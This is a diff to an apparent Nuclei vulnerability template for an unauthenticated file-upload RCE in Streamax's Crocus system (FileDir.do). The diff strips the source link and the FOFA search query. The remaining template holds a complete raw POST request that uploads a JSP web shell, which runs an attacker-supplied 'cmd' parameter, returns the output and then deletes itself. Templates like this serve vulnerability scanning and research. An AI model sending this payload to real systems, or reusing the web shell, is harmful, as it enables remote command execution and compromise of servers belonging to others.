@@ -3,12 +3,8 @@ info:
   name: 锐明技术Crocus系统 FileDir.do 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ih65q7qeggem0bg2'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ih65q7qeggem0bg2
-    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
 http:
 - raw:
   - 'POST /FileDir.do?Action=Upload HTTP/1.1
@@ -35,10 +31,7 @@ http:
 
     <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755323965958-72f5548e-63b3-46d8-a7fb-bf2d6460095c.png)'
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
   redirects: false
   matchers:
   - status:
